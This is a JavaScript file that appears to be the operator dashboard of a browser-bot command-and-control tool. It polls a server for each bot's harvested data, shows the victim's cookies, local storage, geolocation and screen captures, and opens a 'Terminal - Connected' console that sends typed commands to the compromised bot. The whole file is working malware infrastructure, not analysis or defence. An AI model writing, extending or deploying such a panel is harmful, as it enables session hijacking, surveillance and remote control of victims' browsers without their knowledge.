window.onload = function() {
    var navbarItems = document.getElementsByClassName("navbar-item");
    for (var i = 0; i < navbarItems.length; i++) {
        navbarItems[i].style.opacity = "1";
    }
}

const cookiesSection = document.getElementById("cookies-section");
const localStorageSection = document.getElementById("localstorage-section");
const geolocSection = document.getElementById("geoloc-section");
const captureSection = document.getElementById("capture-section");

function update() {
    
    fetch('/output/' + botname)
    .then(response => response.json())
    .then(data => {
        cookiesSection.innerHTML = '<h2>Cookies</h2>';
        localStorageSection.innerHTML = '<h2>Local Storage</h2>';
        geolocSection.innerHTML = '<h2>Geolocation</h2>';
        captureSection.innerHTML = '<h2>Captures</h2>';
        data.forEach(item => {
        if (item.cookies) {
            const cookiesList = document.createElement("ul");
            item.cookies.forEach(cookie => {
            const cookieItem = document.createElement("li");
            cookieItem.textContent = cookie;
            cookiesList.appendChild(cookieItem);
            });
            if (cookiesList.children.length > 0) {
            cookiesSection.innerHTML = '';
            cookiesSection.appendChild(cookiesList);
            } else {
            cookiesSection.innerHTML = 'No data found for cookies';
            }
        }
        if (item.localstorage) {
            const localStorageList = document.createElement("ul");
            item.localstorage.forEach(storage => {
            const storageItem = document.createElement("li");
            storageItem.textContent = `${storage.key}: ${storage.value}`;
            localStorageList.appendChild(storageItem);
            });
            if (localStorageList.children.length > 0) {
            localStorageSection.innerHTML = '';
            localStorageSection.appendChild(localStorageList);
            } else {
            localStorageSection.innerHTML = 'No data found for local storage';
            }
        }
        if (item.geoloc) {
            const geolocItem = document.createElement("p");
            geolocItem.textContent = item.geoloc;
            geolocSection.appendChild(geolocItem);
        }
        if (item.capture) {
            const captureItem = document.createElement("img");
            captureItem.src = item.capture;
            captureItem.style.marginBottom = "25px";
            captureSection.appendChild(captureItem);
        }
        });
    })
    .catch(error => {
        console.error(error);
    });
}

function showTerminal() {
    // Create terminal container
    const terminal = document.createElement("div");
    terminal.classList.add("terminal");
  
    // Create header
    const header = document.createElement("div");
    header.classList.add("header");
  
    // Create title
    const title = document.createElement("div");
    title.classList.add("title");
    title.textContent = "Terminal - Connected";
  
    // Create close button
    const closeButton = document.createElement("div");
    closeButton.classList.add("close-button");
    closeButton.innerHTML = "&#x2715;";
    closeButton.addEventListener("click", () => {
      document.body.removeChild(terminal);
    });
  
    // Append title and close button to header
    header.appendChild(title);
    header.appendChild(closeButton);
  
    // Create output area
    const outputArea = document.createElement("div");
    outputArea.classList.add("output-area");
  
    // Create command input container
    const inputContainer = document.createElement("div");
    inputContainer.classList.add("input-container");
  
    // Create prompt
    const prompt = document.createElement("div");
    prompt.classList.add("prompt");
    prompt.textContent = botname.split("-")[0] + "-#>";
  
    // Create command input
    const commandInput = document.createElement("input");
    commandInput.classList.add("command-input");
    commandInput.setAttribute("type", "text");
    commandInput.setAttribute("spellcheck", false);
  
    // Append elements to input container
    inputContainer.appendChild(prompt);
    inputContainer.appendChild(commandInput);
  
    // Append elements to terminal
    terminal.appendChild(header);
    terminal.appendChild(outputArea);
    terminal.appendChild(inputContainer);
  
    // Append terminal to document body
    document.body.appendChild(terminal);
  
    // Set focus on the command input element
    commandInput.focus();
  
    // Add event listener to command input
    commandInput.addEventListener("keydown", (event) => {
      if (event.key === "Enter") {
        event.preventDefault();
        const command = commandInput.value.trim();
        commandInput.value = "";
        if (command.length > 2) {
          if (command == "clear" ) {
            outputArea.innerHTML = '';
          } else {
            const output = poser(command);
            const outputElement = document.createElement("div");
            outputElement.classList.add("output");
            outputElement.innerHTML = output;
            outputArea.appendChild(outputElement);
          }
        }
      }
    });
}
  

function poser(command) {
  const url = `/bot/${botname}/postmessage/${command}`;
  fetch(url)
    .then(response => {
      if (!response.ok) {
        return 'Error Sending Command: ' + command;
      }
      return 'Sent Command: ' + command;
    })
    .then(data => {
        return 'Sent Command: ' + command;
    })
    .catch(error => {
        return 'Error Sending Command: ' + command;
    });
    return 'Sent Command: ' + command;
    
}

update();
setInterval(update, 5000);